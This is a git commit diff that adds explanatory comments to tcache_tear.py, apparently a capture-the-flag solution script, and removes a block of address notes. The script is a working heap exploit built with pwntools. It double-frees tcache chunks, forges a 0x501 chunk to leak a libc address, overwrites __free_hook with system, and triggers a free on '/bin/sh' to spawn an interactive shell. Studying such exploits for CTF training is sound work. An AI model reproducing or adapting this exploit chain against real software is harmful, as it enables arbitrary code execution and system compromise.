cc21dec07ed1808a65da07dc0eeda1ead0298cc1
ArenS2 <35954698+ArenS2@users.noreply.github.com>
2019-07-29 20:28:05 +0700

    Update tcache_tear.py

--- tcache_tear.py
+++ tcache_tear.py
@@ -33,6 +33,7 @@ def free_f():
 	r.sendline(str(2))
 	r.recvuntil("Your choice :")
 
+# setup memory after chunk (0x500) => safe when free chunk 0x500 	
 malloc_f(0x60, "karthus")
 free_f()
 free_f()
@@ -41,7 +42,7 @@ malloc_f(0x60, "karthus")
 payload = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
 malloc_f(0x60, payload)
 
-
+# setup chunk 0x500 in name variable
 malloc_f(0x80, "lux")
 free_f()
 free_f()
@@ -50,8 +51,10 @@ malloc_f(0x80, "lux")
 payload = p64(0) + p64(0x501) + "a"*0x28 + p64(0x602060)
 malloc_f(0x80, payload)
 
+# leak main_arena+96
 free_f()
 
+# leak base
 r.sendline(str(3))
 s = r.recvuntil("Your choice :")[6:14]
 base = u64(s) - malloc_hook_off - 96 - 16
@@ -59,6 +62,7 @@ sys_addr = base + sys_off
 binsh_addr = base + binsh_off
 free_hook_addr = base + free_hook_off
 
+# overwrite free_hook
 malloc_f(0x50, "sona")
 free_f()
 free_f()
@@ -66,28 +70,8 @@ malloc_f(0x50, p64(free_hook_addr))
 malloc_f(0x50, "sona")
 malloc_f(0x50, p64(sys_addr))
 
+# when free called, call function in free_hook which overwritten by system
 malloc_f(0x40, "/bin/sh\x00")
 r.sendline(str(2))
 r.interactive()
 
-
-
-
-	
-'''
-name = 0x602060
-ptr = 0x602088
-read_name = 0x400bf6
-read_option = 0x400c11
-main: 0x400bc7 - 0x400c84
-malloc_func: 0x400b14 - 0x400b98
-read_size = 0x400b3a
-read_data = 0x400b84
-malloc = 0x400b54
-free = 0x400c54
-atoll = 0x400a02
-read_real_size = 0x4009f6
-'''
-"""
-option_read_size = 0x7fffffffdcb0
-"""
